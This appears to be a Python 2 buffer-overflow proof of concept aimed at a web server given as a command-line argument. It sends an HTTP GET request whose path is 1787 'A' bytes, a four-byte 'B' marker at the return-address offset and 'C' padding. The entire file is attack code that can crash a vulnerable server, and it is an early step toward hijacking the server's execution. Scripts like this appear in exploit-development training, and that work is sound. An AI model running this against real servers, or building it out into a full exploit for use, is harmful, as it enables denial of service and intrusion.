#!/usr/bin/python

import socket, sys
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((sys.argv[1],80))
uniq = 'A' * 1787 + 'B' * 4 + 'C' * (2100-1787-4)
buffer = "GET " + uniq + "HTTP/1.1\r\n\r\n"
sock.send(buffer)
sock.close()
